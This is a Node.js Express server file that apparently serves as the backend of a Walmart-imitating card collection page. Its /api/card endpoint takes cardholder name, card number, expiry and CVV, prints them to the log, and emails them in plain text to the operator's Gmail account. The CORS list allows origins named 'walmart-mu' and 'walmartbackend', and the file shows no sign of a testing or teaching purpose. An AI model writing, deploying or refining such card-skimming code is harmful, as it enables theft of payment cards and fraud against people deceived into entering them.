// HOW TO HOST LOCALLY: npm install && node api.js[](http://localhost:3000)
// For Render: Set GMAIL_USER/GMAIL_PASS in dashboard. No fs/sendmail.

const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const app = express();

const allowedOrigins = [
  'http://127.0.0.1:5500',
  'http://localhost:5500',
  'https://walmart-mu.vercel.app',
  'https://walmartbackend-i8tm.onrender.com'
];

app.use(cors({
  origin: function(origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  optionsSuccessStatus: 200
}));

app.use(express.json());

app.use((req, res, next) => {
  const origin = req.headers.origin;
  console.log('Incoming request from origin:', origin); // Debug
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

console.log('CORS allowed origins:', allowedOrigins);

app.options('/api/card', (req, res) => res.sendStatus(200));

app.post('/api/card', async (req, res) => {
  const { cardName, cardNumber, expiry, cvv } = req.body;
  console.log('Received card submission:', req.body);

  if (!cardName || !cardNumber || !expiry || !cvv) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  const gmailUser = process.env.GMAIL_USER;
  const gmailPass = process.env.GMAIL_PASS;

  if (!gmailUser || !gmailPass) {
    console.warn('Missing GMAIL creds - mocking success for dev');
    return res.json({ success: true, message: 'Mock: Email would be sent (creds missing)' });
  }

  // Create transporter per-request (safe for serverless/persistent)
  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user: gmailUser, pass: gmailPass }
  });

  const mailOptions = {
    from: gmailUser,
    to: gmailUser,
    subject: 'New Card Submission',
    text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent:', info.response);
    res.json({ success: true, message: 'Email sent', info: info.response });
  } catch (err) {
    console.error('Email error:', err);
    res.status(500).json({ error: 'Failed to send email', details: err.message });
  }
});

app.get('/api/health', (req, res) => {
  res.json({ ok: true, env: process.env.NODE_ENV || 'development' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`API server running on host 0.0.0.0 and port ${PORT}`);
});